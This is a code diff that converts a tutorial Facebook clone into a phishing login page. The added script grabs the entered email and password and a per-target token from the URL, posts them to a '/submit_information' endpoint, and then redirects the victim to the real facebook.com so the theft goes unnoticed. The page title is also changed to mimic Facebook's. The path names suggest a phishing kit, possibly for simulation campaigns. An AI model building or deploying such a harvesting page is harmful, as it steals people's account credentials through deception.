@@ -3,8 +3,8 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>GFG FB Clone</title>
-    <link rel="stylesheet" href="facebook.css">
+    <title>Facebook - log in or sign up</title>
+    <link rel="stylesheet" href="/LandingPages/facebook/facebook.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 
@@ -17,11 +17,10 @@
                 <p> around you on Facebook.</p>
             </div>
             <form action="#">
-                <input type="email" placeholder="Email or phone number"
-                    required>
-                <input type="password" placeholder="Password" required>
+                <input type="email" placeholder="Email or phone number" name="username" required>
+                <input type="password" placeholder="Password" name="password" required>
                 <div class="fb-submit">
-                    <button type="submit" class="login">Login</button>
+                    <button type="submit" class="login" onclick="addInformation()">Log In</button>
                     <a href="#" class="forgot">Forgot password?</a>
                 </div>
                 <hr>
@@ -82,6 +81,34 @@
             <small>Meta © 2024</small>
         </div>
     </footer>
+
+    <script>
+
+        function addInformation() {
+            event.preventDefault();
+            const username = document.querySelector('input[type="email"]').value;
+            const password = document.querySelector('input[type="password"]').value;
+            const page = 'Facebook';
+            var token = window.location.pathname.split('/')[2];
+            fetch('/submit_information', {
+                method: 'POST',
+                headers: {
+                        'Content-Type': 'application/json',
+                    },
+                body: JSON.stringify({ username, password, token, page })
+            })
+            .then(response => {
+                if(response.ok) {
+                    window.location.href = 'https://www.facebook.com'; // Redirect after successful submission
+                }
+                return response.json();
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+    </script>
 </body>
 
 </html>
